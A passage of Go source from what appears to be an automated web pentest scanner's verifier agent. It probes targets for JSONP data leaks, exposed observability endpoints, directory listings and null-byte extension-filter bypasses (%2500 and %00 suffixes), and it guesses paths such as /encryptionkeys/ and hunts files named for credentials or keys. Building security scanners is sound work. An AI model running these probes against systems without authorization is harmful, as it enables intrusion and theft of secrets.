		if !strings.EqualFold(entry.Request.Method, "GET") ||
			entry.Response.StatusCode < 200 || entry.Response.StatusCode >= 400 {
			continue
		}
		if !jsonishResponse(entry.Response.ContentType, string(entry.Response.Body)) {
			continue
		}
		rawURL, path, ok := projectionBaseURL(entry.Request.URL)
		if !ok {
			continue
		}
		if !projectionCandidate(entry.Request.URL, entry.Request.Path, string(entry.Response.Body)) {
			continue
		}
		if seen[rawURL] {
			continue
		}
		seen[rawURL] = true
		out = append(out, projectionProbeTarget{
			BaseURL: rawURL,
			Path:    path,
			Source:  entry.Request.URL,
		})
		if len(out) >= 30 {
			break
		}
	}
	return out
}

func projectionBaseURL(rawURL string) (string, string, bool) {
	parsed, err := url.Parse(rawURL)
	if err != nil || parsed.Scheme == "" || parsed.Host == "" {
		return "", "", false
	}
	path := parsed.Path
	if path == "" {
		path = "/"
	}
	parsed.RawQuery = ""
	parsed.Fragment = ""
	return parsed.String(), path, true
}

func projectionCandidate(rawURL, path, body string) bool {
	parsed, _ := url.Parse(rawURL)
	if parsed != nil {
		for _, key := range []string{"fields", "select", "include", "projection", "columns"} {
			if _, ok := parsed.Query()[key]; ok {
				return true
			}
		}
	}
	lowerPath := strings.ToLower(path)
	if lowerPath == "" && parsed != nil {
		lowerPath = strings.ToLower(parsed.Path)
	}
	for _, marker := range []string{
		"/whoami", "/me", "/current", "/profile", "/account", "/session",
		"/auth", "/user", "/users", "/member", "/customer",
	} {
		if strings.Contains(lowerPath, marker) {
			return true
		}
	}
	lowerBody := strings.ToLower(firstNRunes(body, 500))
	return strings.Contains(lowerBody, `"user"`) &&
		(strings.Contains(lowerBody, `"email"`) || strings.Contains(lowerBody, `"id"`))
}

func jsonishResponse(contentType, body string) bool {
	trimmed := strings.TrimSpace(body)
	if trimmed == "" {
		return false
	}
	lowerCT := strings.ToLower(contentType)
	return strings.Contains(lowerCT, "json") ||
		strings.HasPrefix(trimmed, "{") ||
		strings.HasPrefix(trimmed, "[")
}

func projectionParamOrder(rawURL string, defaults []string) []string {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return defaults
	}
	seen := make(map[string]bool)
	var out []string
	for _, key := range []string{"fields", "select", "include", "projection", "columns"} {
		if _, ok := parsed.Query()[key]; ok {
			out = append(out, key)
			seen[key] = true
		}
	}
	for _, key := range defaults {
		if !seen[key] {
			out = append(out, key)
		}
	}
	return out
}

func projectionURLWithFields(baseURL, paramName, fields string) string {
	parsed, err := url.Parse(baseURL)
	if err != nil || parsed.Scheme == "" || parsed.Host == "" {
		return ""
	}
	q := parsed.Query()
	q.Set(paramName, fields)
	parsed.RawQuery = q.Encode()
	return parsed.String()
}

func projectionAuthAttempts(headers map[string]string, source string) []projectionAuthAttempt {
	base := cloneHeaderMap(headers)
	if len(base) == 0 {
		return nil
	}
	var out []projectionAuthAttempt
	seen := make(map[string]bool)
	add := func(h map[string]string, src string) {
		if len(h) == 0 {
			return
		}
		key := stableHeaderFingerprint(h)
		if seen[key] {
			return
		}
		seen[key] = true
		out = append(out, projectionAuthAttempt{Headers: h, Source: src})
	}
	add(base, source)
	if token := bearerTokenFromHeaders(base); token != "" {
		withCookie := cloneHeaderMap(base)
		withCookie["Cookie"] = appendCookieValue(withCookie["Cookie"], "token", token)
		add(withCookie, source+" + bearer token mirrored into Cookie: token")
		cookieOnly := map[string]string{"Cookie": appendCookieValue("", "token", token)}
		add(cookieOnly, source+" + bearer token as Cookie: token")
	}
	return out
}

func cloneHeaderMap(in map[string]string) map[string]string {
	if len(in) == 0 {
		return nil
	}
	out := make(map[string]string, len(in))
	for k, v := range in {
		if strings.TrimSpace(k) == "" || strings.TrimSpace(v) == "" {
			continue
		}
		out[k] = v
	}
	return out
}

func bearerTokenFromHeaders(headers map[string]string) string {
	for k, v := range headers {
		if strings.EqualFold(k, "Authorization") {
			parts := strings.Fields(v)
			if len(parts) == 2 && strings.EqualFold(parts[0], "Bearer") {
				return strings.TrimSpace(parts[1])
			}
		}
	}
	return ""
}

func appendCookieValue(existing, name, value string) string {
	name = strings.TrimSpace(name)
	value = strings.TrimSpace(value)
	if name == "" || value == "" {
		return existing
	}
	pair := name + "=" + value
	if strings.TrimSpace(existing) == "" {
		return pair
	}
	lowerName := strings.ToLower(name)
	for _, part := range strings.Split(existing, ";") {
		if strings.EqualFold(strings.TrimSpace(strings.SplitN(part, "=", 2)[0]), lowerName) {
			return existing
		}
	}
	return strings.TrimRight(existing, "; ") + "; " + pair
}

func stableHeaderFingerprint(headers map[string]string) string {
	keys := sortedMapKeys(headers)
	var b strings.Builder
	for _, key := range keys {
		b.WriteString(strings.ToLower(key))
		b.WriteString("=")
		b.WriteString(headers[key])
		b.WriteString("\n")
	}
	return b.String()
}

// probeJSONPCallbackLeaks checks whether JSON-ish identity/account endpoints
// can be coerced into JSONP via callback/cb/jsonp parameters. This is useful
// when a modern API still supports legacy cross-origin script inclusion and
// returns user data inside the callback.
func (v *VerifierAgent) probeJSONPCallbackLeaks(ctx context.Context, entries []types.TrafficEntry) {
	targets := projectionProbeTargets(entries)
	if len(targets) == 0 {
		return
	}
	callbackName := "AOBTD_JSONP_PROOF"
	paramNames := []string{"callback", "jsonp", "cb"}
	checked := 0
	const maxJSONPChecks = 60

	for _, target := range targets {
		if ctx.Err() != nil || checked >= maxJSONPChecks {
			return
		}
		baseHeaders, authSource := v.credentialHeadersForURL(target.BaseURL)
		authAttempts := []projectionAuthAttempt{{Headers: nil, Source: "anonymous JSONP probe"}}
		if len(baseHeaders) > 0 {
			authAttempts = append(authAttempts, projectionAuthAttempts(baseHeaders, authSource)...)
		}
		for _, paramName := range paramNames {
			for _, attempt := range authAttempts {
				if ctx.Err() != nil || checked >= maxJSONPChecks {
					return
				}
				u := jsonpURLWithCallback(target.BaseURL, paramName, callbackName)
				if u == "" {
					continue
				}
				checked++
				resp, body, _, err := v.proactiveGETWithHeaders(ctx, u, attempt.Headers,
					"AOBTD/Verifier (JSONP callback probe)")
				if err != nil || resp == nil {
					continue
				}
				v.tested++
				if resp.StatusCode < 200 || resp.StatusCode >= 300 {
					v.dismissed++
					continue
				}
				detection := jsonpExposureSignal(body, callbackName)
				if detection.Signal == "" {
					v.dismissed++
					continue
				}
				v.confirmed++
				source := fmt.Sprintf("JSONP callback probe using %q on %s", paramName, target.Source)
				if attempt.Source != "" {
					source += " (" + attempt.Source + ")"
				}
				v.storeJSONPExposureFinding(u, target.Path, resp.StatusCode,
					resp.Header.Get("Content-Type"), body, detection, source)
				v.db.InsertNarration(v.scanID, "verifier", "confirmed",
					fmt.Sprintf("JSONP callback on %s exposed %s.", target.Path, detection.Signal),
					u, map[string]any{"callback_param": paramName, "auth_source": attempt.Source})
				break
			}
		}
	}
}

func jsonpURLWithCallback(baseURL, paramName, callbackName string) string {
	parsed, err := url.Parse(baseURL)
	if err != nil || parsed.Scheme == "" || parsed.Host == "" {
		return ""
	}
	q := parsed.Query()
	q.Set(paramName, callbackName)
	parsed.RawQuery = q.Encode()
	return parsed.String()
}

func jsonpExposureSignal(body, callbackName string) apiExposureSignal {
	payload, ok := extractJSONPCallbackPayload(body, callbackName)
	if !ok {
		return apiExposureSignal{}
	}
	detection := sensitiveAPIExposureSignalDetail("application/json", payload)
	if detection.Signal != "" {
		detection.Signal = "JSONP callback wraps " + detection.Signal
		return detection
	}
	var parsed any
	if err := json.Unmarshal([]byte(payload), &parsed); err != nil {
		return apiExposureSignal{}
	}
	facts := newAPIExposureFacts()
	collectAPIExposureFacts(parsed, facts)
	if len(facts.emails) > 0 {
		return apiExposureSignal{
			Signal: fmt.Sprintf("JSONP callback exposes user email(s): %s",
				strings.Join(firstNStrings(facts.emails, 3), ", ")),
			Severity: types.SeverityMedium,
			Class:    apiExposurePersonalData,
		}
	}
	if len(facts.piiKeys) > 0 {
		return apiExposureSignal{
			Signal: fmt.Sprintf("JSONP callback exposes personal data field(s): %s",
				strings.Join(firstNStrings(facts.piiKeys, 4), ", ")),
			Severity: types.SeverityMedium,
			Class:    apiExposurePersonalData,
		}
	}
	return apiExposureSignal{}
}

func extractJSONPCallbackPayload(body, callbackName string) (string, bool) {
	callbackName = strings.TrimSpace(callbackName)
	if callbackName == "" {
		return "", false
	}
	idx := strings.Index(body, callbackName)
	if idx < 0 {
		return "", false
	}
	openRel := strings.Index(body[idx+len(callbackName):], "(")
	if openRel < 0 {
		return "", false
	}
	start := idx + len(callbackName) + openRel + 1
	inString := false
	escaped := false
	depth := 1
	for i := start; i < len(body); i++ {
		ch := body[i]
		if inString {
			if escaped {
				escaped = false
				continue
			}
			if ch == '\\' {
				escaped = true
				continue
			}
			if ch == '"' {
				inString = false
			}
			continue
		}
		switch ch {
		case '"':
			inString = true
		case '(':
			depth++
		case ')':
			depth--
			if depth == 0 {
				payload := strings.TrimSpace(body[start:i])
				return payload, payload != ""
			}
		}
	}
	return "", false
}

func (v *VerifierAgent) storeJSONPExposureFinding(rawURL, path string, status int,
	contentType, body string, detection apiExposureSignal, source string,
) {
	requestTarget := path
	if parsed, err := url.Parse(rawURL); err == nil {
		if parsed.Path != "" {
			path = parsed.Path
		}
		if parsed.RequestURI() != "" {
			requestTarget = parsed.RequestURI()
		}
	}
	if path == "" {
		path = "/"
	}
	if requestTarget == "" {
		requestTarget = path
	}
	severity := detection.Severity
	if severity == "" {
		severity = types.SeverityMedium
	}
	profile := types.PageProfile{ID: "GET " + path, URL: rawURL, Method: "GET"}
	v.storeFinding(profile, types.Finding{
		Title:       fmt.Sprintf("JSONP callback leaks sensitive data at %s", path),
		Description: fmt.Sprintf("GET %s returned executable JavaScript wrapping user/account JSON in an operator-controlled callback. Signal: %s. Source: %s.", path, detection.Signal, source),
		Severity:    severity,
		Confidence:  types.ConfidenceConfirmed,
		EndpointID:  "GET " + path,
		VulnType:    "jsonp_sensitive_data_leak",
		Payload:     "callback=AOBTD_JSONP_PROOF",
		PocRequest:  fmt.Sprintf("GET %s HTTP/1.1\nHost: <target>\n", requestTarget),
		PocResponse: fmt.Sprintf("HTTP/1.1 %d\nContent-Type: %s\n\n%s", status, contentType, truncateString(body, 800)),
		StepsToReproduce: fmt.Sprintf("1. Send GET %s.\n2. Observe the response is JavaScript invoking the supplied callback.\n3. Observe the callback payload contains %s.",
			requestTarget, detection.Signal),
		Impact:      "Legacy JSONP responses can be included cross-origin via a <script> tag, bypassing same-origin JSON protections and exposing account data to an attacker-controlled site.",
		Remediation: "Remove JSONP support from authenticated or sensitive endpoints. Return JSON with a strict Content-Type and require CORS allowlists for browser cross-origin access.",
		Evidence: fmt.Sprintf("URL: %s\nStatus: %d\nContent-Type: %s\nSignal: %s\nBody preview: %s",
			rawURL, status, contentType, detection.Signal, truncateString(body, 500)),
	})
}

// probeObservabilityEndpoints hits Prometheus / Swagger / actuator paths
// and fires a Finding when the response matches a real-content signal
// (not just a 200 SPA fallback).
func (v *VerifierAgent) probeObservabilityEndpoints(ctx context.Context, target string) {
	type observCase struct {
		path, signal, title, vulnType string
		severity                      types.Severity
	}
	cases := []observCase{
		{"/metrics", "# HELP", "Unauthenticated Prometheus metrics exposed at /metrics",
			"observability_disclosure", types.SeverityMedium},
		{"/api-docs", "swagger-ui", "API schema disclosed via Swagger UI at /api-docs",
			"api_spec_disclosure", types.SeverityLow},
		{"/api-docs/", "swagger-ui", "API schema disclosed via Swagger UI at /api-docs/",
			"api_spec_disclosure", types.SeverityLow},
		{"/actuator", "\"_links\"", "Spring Boot actuator exposed at /actuator",
			"observability_disclosure", types.SeverityHigh},
	}

	for _, tc := range cases {
		if ctx.Err() != nil {
			return
		}
		u := target + tc.path
		resp, body, _, err := v.proactiveGET(ctx, u)
		if err != nil || resp == nil || resp.StatusCode != 200 {
			continue
		}
		v.tested++
		if !strings.Contains(strings.ToLower(body), strings.ToLower(tc.signal)) {
			v.dismissed++
			continue
		}
		v.confirmed++
		profile := types.PageProfile{ID: "GET " + tc.path, URL: u, Method: "GET"}
		v.storeFinding(profile, types.Finding{
			Title: tc.title,
			Description: fmt.Sprintf(
				"Unauthenticated GET %s returned %d bytes containing the %q signature — "+
					"a hallmark of %s that should not be reachable from the public internet.",
				tc.path, len(body), tc.signal, tc.vulnType),
			Severity: tc.severity, Confidence: types.ConfidenceConfirmed,
			EndpointID: "GET " + tc.path, VulnType: tc.vulnType,
			Payload:    "(no payload — direct GET)",
			PocRequest: fmt.Sprintf("GET %s HTTP/1.1\nHost: <target>\n", tc.path),
			PocResponse: fmt.Sprintf("HTTP/1.1 %d\n\n%s",
				resp.StatusCode, truncateString(body, 600)),
			StepsToReproduce: fmt.Sprintf("1. GET %s unauthenticated.\n"+
				"2. Observe %q in the response body.\n"+
				"3. Enumerate the exposed data to profile the stack.",
				tc.path, tc.signal),
			Impact: "Observability endpoints reveal application internals (metric names, " +
				"endpoint inventory, framework versions). Attackers use the data to plan " +
				"targeted attacks against internal subsystems.",
			Remediation: "Gate observability endpoints behind authentication, bind them to a " +
				"loopback / management network only, or remove them from production.",
			Evidence: fmt.Sprintf("URL: %s\nStatus: %d\nBody preview: %s",
				u, resp.StatusCode, truncateString(body, 400)),
		})
		v.db.InsertNarration(v.scanID, "verifier", "confirmed",
			fmt.Sprintf("%s returned real observability output — unauthenticated endpoint.", tc.path),
			u, nil)
	}
}

// probeSecurityPolicyDiscovery checks the standard security.txt locations and
// records the result as target understanding. This is intentionally not stored
// as a vulnerability: a public security policy is expected, but it is useful
// recon for a human-like pentest narrative (scope, contact, disclosure flow,
// advisory feeds, safe-harbor clues).
func (v *VerifierAgent) probeSecurityPolicyDiscovery(ctx context.Context, target string) {
	target = strings.TrimRight(target, "/")
	if target == "" {
		return
	}
	for _, path := range []string{"/.well-known/security.txt", "/security.txt"} {
		if ctx.Err() != nil {
			return
		}
		u := target + path
		resp, body, _, err := v.proactiveGET(ctx, u)
		if err != nil || resp == nil {
			continue
		}
		v.tested++
		if resp.StatusCode != http.StatusOK {
			v.dismissed++
			continue
		}
		signal := securityPolicyBodySignal(body)
		if signal == "" {
			v.dismissed++
			continue
		}
		v.confirmed++
		_ = v.db.UpsertProfile(v.scanID, &types.PageProfile{
			ID:           "GET " + path,
			URL:          u,
			Method:       http.MethodGet,
			Purpose:      "Security policy / responsible disclosure metadata endpoint.",
			AuthRequired: "none",
			DataExposed:  []string{"security contact and disclosure policy metadata"},
			Behaviors: []string{
				"Publishes machine-readable security.txt metadata",
				"Helps identify vulnerability disclosure contacts and advisory workflow",
			},
			TechNotes:  fmt.Sprintf("security.txt signal: %s. Body preview: %s", signal, truncateString(body, 350)),
			Confidence: 0.95,
		})
		v.db.InsertNarration(v.scanID, "verifier", "recon",
			fmt.Sprintf("%s exposes security.txt metadata (%s); treating it as target-understanding context, not a vulnerability.",
				path, signal),
			u, map[string]any{
				"path":         path,
				"signal":       signal,
				"status":       resp.StatusCode,
				"body_preview": truncateString(body, 240),
			})
		return
	}
}

func securityPolicyBodySignal(body string) string {
	lower := strings.ToLower(body)
	if strings.TrimSpace(lower) == "" {
		return ""
	}
	var hits []string
	for _, field := range []string{
		"contact:", "expires:", "encryption:", "acknowledgments:",
		"acknowledgements:", "preferred-languages:", "policy:", "hiring:",
		"canonical:", "csaf:",
	} {
		if strings.Contains(lower, field) {
			hits = append(hits, strings.TrimSuffix(field, ":"))
		}
	}
	if len(hits) >= 2 {
		limit := len(hits)
		if limit > 4 {
			limit = 4
		}
		return strings.Join(hits[:limit], ", ")
	}
	if len(hits) == 1 && strings.Contains(lower, "security") {
		return hits[0]
	}
	return ""
}

// probeNullByteBypass tries the classic %00.<allowed-ext> trick against
// static-file routes that appear to enforce a suffix whitelist. Generic:
// the probe operates on static-file endpoints observed by the crawler and
// permutes each one against a corpus of backup / sensitive extensions.
//
// The bug class: server does the extension check before stripping null
// bytes, so `/files/secret.bak%2500.md` satisfies ".md is allowed" at
// the filter layer but the filesystem serves `secret.bak`.
func (v *VerifierAgent) probeNullByteBypass(ctx context.Context, target string) {
	// Discover static-file endpoints from captured traffic.
	observed, _ := discovery.DiscoverStaticFileEndpoints(v.db, v.scanID)
	if len(observed) == 0 {
		return // no observed static files → nothing to pivot from
	}

	// Extensions to probe as the "hidden" real extension behind the null
	// byte. Kept to a small, industry-generic set.
	shadowExts := []string{".bak", ".old", ".backup", ".swp", ".orig"}

	// Unique "allowed" extensions from observed traffic — that's what
	// goes after the null byte. Derived from the observed paths so the
	// probe adapts to whatever the server actually accepts.
	allowedExts := make(map[string]struct{})
	for _, ep := range observed {
		p := strings.ToLower(ep.Path)
		if idx := strings.LastIndex(p, "."); idx > 0 {
			allowedExts[p[idx:]] = struct{}{}
		}
	}
	if len(allowedExts) == 0 {
		allowedExts[".md"] = struct{}{}
		allowedExts[".pdf"] = struct{}{}
	}

	// Track probed permutations so we don't hit the same URL multiple times.
	probed := make(map[string]bool)

	for _, ep := range observed {
		if ctx.Err() != nil {
			return
		}
		// Strip the leading "/" and the trailing extension to get a base name.
		base := ep.Path
		if idx := strings.LastIndex(base, "."); idx > 0 {
			base = base[:idx]
		}
		for _, shadow := range shadowExts {
			for allowed := range allowedExts {
				// URL shape: <base><shadow>%2500<allowed>
				probePath := fmt.Sprintf("%s%s%%2500%s", base, shadow, allowed)
				if probed[probePath] {
					continue
				}
				probed[probePath] = true
				u := target + probePath

				resp, body, _, err := v.proactiveGET(ctx, u)
				if err != nil || resp == nil || resp.StatusCode != 200 {
					continue
				}
				v.tested++

				// Confirmation: the body doesn't look like the SPA's default
				// HTML shell. Signal is generic (Content-Type ≠ text/html
				// AND body non-empty) — the specific contents depend on what
				// the attacker-accessed file happens to contain.
				ctLower := strings.ToLower(resp.Header.Get("Content-Type"))
				if len(body) == 0 ||
					strings.Contains(ctLower, "text/html") {
					v.dismissed++
					continue
				}
				v.confirmed++
				profile := types.PageProfile{
					ID: "GET " + probePath, URL: u, Method: "GET",
				}
				v.storeFinding(profile, types.Finding{
					Title: fmt.Sprintf(
						"Null-byte extension-filter bypass: %s%s served via %%2500%s suffix",
						base, shadow, allowed),
					Description: fmt.Sprintf(
						"The static-file route appears to enforce an extension allowlist, but the "+
							"check runs before null-byte normalisation. Appending URL-encoded "+
							"null + an allowed extension (`%%2500%s`) makes the server serve %s%s "+
							"while the filter sees an allowed extension.",
						allowed, base, shadow),
					Severity:   types.SeverityHigh,
					Confidence: types.ConfidenceConfirmed,
					EndpointID: "GET " + probePath,
					VulnType:   "path_traversal",
					Payload:    fmt.Sprintf("%%2500%s (null-byte extension suffix)", allowed),
					PocRequest: fmt.Sprintf("GET %s HTTP/1.1\nHost: <target>\n", probePath),
					PocResponse: fmt.Sprintf("HTTP/1.1 %d\nContent-Type: %s\n\n%s",
						resp.StatusCode, ctLower, truncateString(body, 600)),
					StepsToReproduce: fmt.Sprintf(
						"1. GET %s unauthenticated.\n"+
							"2. Server returns the contents of %s%s — real extension is outside the allowlist.\n"+
							"3. Repeat against other backup / non-text files.",
						probePath, base, shadow),
					Impact: "Bypasses the backup-file filter. Restored files often contain credentials, " +
						"schema, tokens, or configuration the maintainer assumed were unreachable.",
					Remediation: "Reject any path containing null bytes (`0x00`, `%00`, `%2500`) " +
						"before performing the extension check.",
					Evidence: fmt.Sprintf("URL: %s\nStatus: %d\nContent-Type: %s\nBody length: %d",
						u, resp.StatusCode, ctLower, len(body)),
				})
				v.db.InsertNarration(v.scanID, "verifier", "confirmed",
					fmt.Sprintf("%s%s served via null-byte bypass — extension filter circumvented.",
						base, shadow),
					u, nil)
			}
		}
	}
}

var hrefRe = regexp.MustCompile(`(?i)\bhref\s*=\s*["']([^"']+)["']`)

// probeDirectoryListingArtifacts pivots from observed static-file URLs to
// their parent directory. If the server exposes an auto-index / directory
// listing, it parses linked files and confirms sensitive document/config
// exposure using content-based signals. This is the "human sees a file, opens
// the folder" move, expressed generically.
func (v *VerifierAgent) probeDirectoryListingArtifacts(ctx context.Context, target string) {
	observed, _ := discovery.DiscoverStaticFileEndpoints(v.db, v.scanID)

	dirs := make(map[string]struct{})
	for _, ep := range observed {
		dir := parentURLPath(ep.Path)
		if dir != "" {
			dirs[dir] = struct{}{}
		}
		if len(dirs) >= 20 {
			break
		}
	}
	for _, dir := range conventionalDirectoryListingDirs() {
		if len(dirs) >= 32 {
			break
		}
		dirs[dir] = struct{}{}
	}

	for dir := range dirs {
		if ctx.Err() != nil {
			return
		}
		dirURL := target + dir
		resp, body, _, err := v.proactiveGET(ctx, dirURL)
		if err != nil || resp == nil || resp.StatusCode != 200 {
			continue
		}
		v.tested++
		links := directoryListingLinks(dirURL, body)
		if !looksLikeDirectoryListing(body, links) {
			v.dismissed++
			continue
		}

		v.confirmed++
		v.storeDirectoryListingFinding(dir, dirURL, resp.StatusCode, resp.Header.Get("Content-Type"), body, links)
		v.db.InsertNarration(v.scanID, "verifier", "confirmed",
			fmt.Sprintf("%s exposes a directory listing with %d linked files — pivoting into artifacts.", dir, len(links)),
			dirURL, nil)

		v.probeListedArtifacts(ctx, target, dir, links)
	}
}

func (v *VerifierAgent) storeDirectoryListingFinding(dir, dirURL string, status int, contentType, body string, links []string) {
	if dir == "" {
		if parsed, err := url.Parse(dirURL); err == nil {
			dir = parsed.Path
		}
	}
	if dir == "" {
		dir = "/"
	}
	profile := types.PageProfile{ID: "GET " + dir, URL: dirURL, Method: "GET"}
	v.storeFinding(profile, types.Finding{
		Title:       fmt.Sprintf("Directory listing exposed at %s", dir),
		Description: fmt.Sprintf("Unauthenticated GET %s returned an index page listing %d linked file(s). Directory indexes expose the application’s deploy-time artifacts and let attackers pivot into backups, documents, or configuration files without guessing names.", dir, len(links)),
		Severity:    types.SeverityMedium,
		Confidence:  types.ConfidenceConfirmed,
		EndpointID:  "GET " + dir,
		VulnType:    "directory_listing",
		Payload:     "(no payload — direct GET)",
		PocRequest:  fmt.Sprintf("GET %s HTTP/1.1\nHost: <target>\n", dir),
		PocResponse: fmt.Sprintf("HTTP/1.1 %d\nContent-Type: %s\n\n%s", status, contentType, truncateString(body, 600)),
		StepsToReproduce: fmt.Sprintf("1. GET %s unauthenticated.\n2. Observe that the response lists server-side files.\n3. Follow the listed links and review them for secrets, internal documents, and backups.",
			dir),
		Impact:      "Attackers can enumerate file names that should not be publicly discoverable, including backups, private documents, build manifests, and configuration artifacts.",
		Remediation: "Disable directory indexes / autoindexing in production. Serve only explicitly allowed public files, and keep backups/configuration outside the web root.",
		Evidence:    fmt.Sprintf("URL: %s\nLinked files observed: %d\nSample links: %s", dirURL, len(links), strings.Join(firstNStrings(links, 8), ", ")),
	})
}

func conventionalDirectoryListingDirs() []string {
	return []string{
		"/ftp/",
		"/files/",
		"/file/",
		"/downloads/",
		"/download/",
		"/docs/",
		"/documents/",
		"/public/",
		"/uploads/",
		"/upload/",
		"/backup/",
		"/backups/",
		"/logs/",
		"/log/",
		"/support/logs/",
		"/encryptionkeys/",
		"/keys/",
	}
}

func (v *VerifierAgent) probeListedArtifacts(ctx context.Context, target, dir string, links []string) {
	seen := make(map[string]struct{}, len(links))
	allowedExts := directoryListingAllowedExtensions(links)
	checked := 0
	for _, linkPath := range links {
		if ctx.Err() != nil {
			return
		}
		if _, ok := seen[linkPath]; ok {
			continue
		}
		seen[linkPath] = struct{}{}
		if !strings.HasPrefix(linkPath, dir) || strings.HasSuffix(linkPath, "/") {
			continue
		}
		if checked >= 40 {
			return
		}
		checked++
		u := target + linkPath
		resp, body, _, err := v.proactiveGET(ctx, u)
		if err != nil || resp == nil || resp.StatusCode != 200 || strings.TrimSpace(body) == "" {
			if v.probeListedArtifactFilterBypass(ctx, target, dir, linkPath, allowedExts) {
				continue
			}
			continue
		}
		v.tested++
		hit, severity := exposedArtifactSignal(linkPath, resp.Header.Get("Content-Type"), body)
		if hit == "" {
			if v.probeListedArtifactFilterBypass(ctx, target, dir, linkPath, allowedExts) {
				continue
			}
			v.dismissed++
			continue
		}
		v.confirmed++
		profile := types.PageProfile{ID: "GET " + linkPath, URL: u, Method: "GET"}
		v.storeFinding(profile, types.Finding{
			Title:       fmt.Sprintf("Exposed artifact discovered from directory listing: %s", linkPath),
			Description: fmt.Sprintf("The directory listing at %s exposed %s, and unauthenticated GET returned content matching %q. This is a confirmed information disclosure discovered by following server-provided links, not by guessing a target-specific filename.", dir, linkPath, hit),
			Severity:    severity,
			Confidence:  types.ConfidenceConfirmed,
			EndpointID:  "GET " + linkPath,
			VulnType:    "info_disclosure",
			Payload:     "(no payload — direct GET from directory listing)",
			PocRequest:  fmt.Sprintf("GET %s HTTP/1.1\nHost: <target>\n", linkPath),
			PocResponse: fmt.Sprintf("HTTP/1.1 %d\nContent-Type: %s\n\n%s", resp.StatusCode, resp.Header.Get("Content-Type"), truncateString(body, 800)),
			StepsToReproduce: fmt.Sprintf("1. GET %s and observe the listed link to %s.\n2. GET %s unauthenticated.\n3. Observe %q in the response body.",
				dir, linkPath, linkPath, hit),
			Impact:      "Publicly exposed artifacts often disclose confidential business information, dependency manifests, backups, or operational details that materially improve an attacker’s ability to target the application.",
			Remediation: "Remove private artifacts from the web root. Require authentication for internal documents. Disable directory indexes so file names cannot be enumerated.",
			Evidence:    fmt.Sprintf("URL: %s\nStatus: %d\nSignal: %s\nBody length: %d", u, resp.StatusCode, hit, len(body)),
		})
		v.db.InsertNarration(v.scanID, "verifier", "confirmed",
			fmt.Sprintf("%s looks sensitive (%s) and is reachable without auth.", linkPath, hit),
			u, nil)
	}
}

func directoryListingAllowedExtensions(links []string) []string {
	seen := make(map[string]struct{})
	var out []string
	add := func(ext string) {
		ext = strings.ToLower(strings.TrimSpace(ext))
		if ext == "" || ext == "." || len(ext) > 12 {
			return
		}
		if _, ok := seen[ext]; ok {
			return
		}
		seen[ext] = struct{}{}
		out = append(out, ext)
	}
	for _, link := range links {
		path := link
		if parsed, err := url.Parse(link); err == nil && parsed.Path != "" {
			path = parsed.Path
		}
		idx := strings.LastIndex(path, ".")
		if idx < 0 {
			continue
		}
		ext := path[idx:]
		switch strings.ToLower(ext) {
		case ".md", ".pdf", ".txt", ".log", ".json", ".csv", ".xml", ".yaml", ".yml":
			add(ext)
		}
	}
	if len(out) == 0 {
		for _, ext := range []string{".txt", ".md", ".pdf"} {
			add(ext)
		}
	}
	if len(out) > 5 {
		return out[:5]
	}
	return out
}

func directoryListedArtifactWorthBypass(path string) bool {
	lower := strings.ToLower(path)
	if discovery.IsSensitivePath(lower) {
		return true
	}
	if directoryListedArtifactHasUnusualExtension(lower) {
		return true
	}
	for _, marker := range []string{
		".bak", ".backup", ".old", ".orig", ".swp", ".swo", ".pyc", ".kdbx",
		"backup", "secret", "credential", "password", "key", "token",
		"access.log", "error.log", "audit", "config", "package-lock",
		"suspicious", "signature", "sigma", "rule", "rules", "errors",
	} {
		if strings.Contains(lower, marker) {
			return true
		}
	}
	return false
}

func directoryListedArtifactHasUnusualExtension(path string) bool {
	path = strings.ToLower(strings.TrimSpace(canonicalArtifactSignalPath(path)))
	if path == "" || strings.HasSuffix(path, "/") {
		return false
	}
	lastSlash := strings.LastIndex(path, "/")
	lastDot := strings.LastIndex(path, ".")
	if lastDot <= lastSlash || lastDot == len(path)-1 {
		return false
	}
	ext := path[lastDot:]
	if len(ext) > 12 {
		return false
	}
	switch ext {
	case ".html", ".htm", ".css", ".js", ".mjs", ".map",
		".json", ".xml", ".txt", ".md", ".pdf", ".csv", ".yaml", ".yml",
		".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico", ".webp", ".avif",
		".woff", ".woff2", ".ttf", ".eot", ".otf", ".mp4", ".webm", ".mp3":
		return false
	}
	return true
}

func (v *VerifierAgent) probeListedArtifactFilterBypass(ctx context.Context, target, dir, linkPath string, allowedExts []string) bool {
	if !directoryListedArtifactWorthBypass(linkPath) {
		return false
	}
	for _, allowed := range allowedExts {
		for _, nullSuffix := range []string{"%2500", "%00"} {
			if ctx.Err() != nil {
				return false
			}
			probePath := linkPath + nullSuffix + allowed
			u := target + probePath
			resp, body, _, err := v.proactiveGET(ctx, u)
			if err != nil || resp == nil || resp.StatusCode != 200 || strings.TrimSpace(body) == "" {
				continue
			}
			v.tested++
			hit, severity := exposedArtifactSignal(probePath, resp.Header.Get("Content-Type"), body)
			if hit == "" {
				v.dismissed++
				continue
			}
			v.confirmed++
			if severity == "" {
				severity = types.SeverityHigh
			}
			profile := types.PageProfile{ID: "GET " + probePath, URL: u, Method: "GET"}
			v.storeFinding(profile, types.Finding{
				Title:       fmt.Sprintf("Extension-filter bypass exposes listed artifact: %s", linkPath),
				Description: fmt.Sprintf("The directory listing at %s revealed %s, but direct access was blocked or uninteresting. Appending a URL-encoded null-byte suffix plus an allowed extension (%s%s) caused the server to return sensitive non-HTML content matching %q.", dir, linkPath, nullSuffix, allowed, hit),
				Severity:    severity,
				Confidence:  types.ConfidenceConfirmed,
				EndpointID:  "GET " + probePath,
				VulnType:    "path_traversal",
				Payload:     fmt.Sprintf("%s%s", nullSuffix, allowed),
				PocRequest:  fmt.Sprintf("GET %s HTTP/1.1\nHost: <target>\n", probePath),
				PocResponse: fmt.Sprintf("HTTP/1.1 %d\nContent-Type: %s\n\n%s", resp.StatusCode, resp.Header.Get("Content-Type"), truncateString(body, 800)),
				StepsToReproduce: fmt.Sprintf("1. GET %s and observe the listed file %s.\n2. Request %s.\n3. Observe that the blocked/sensitive artifact is served through an allowed-extension suffix.",
					dir, linkPath, probePath),
				Impact:      "Extension filters are being applied to the attacker-controlled suffix instead of the canonical file path. Attackers can retrieve backups, key material, dependency manifests, and other files maintainers expected to be blocked.",
				Remediation: "Canonicalize and reject null bytes before extension allowlist checks. Prefer serving files by immutable IDs from an allowlisted store instead of mapping arbitrary request paths to the filesystem.",
				Evidence:    fmt.Sprintf("URL: %s\nStatus: %d\nSignal: %s\nBody length: %d", u, resp.StatusCode, hit, len(body)),
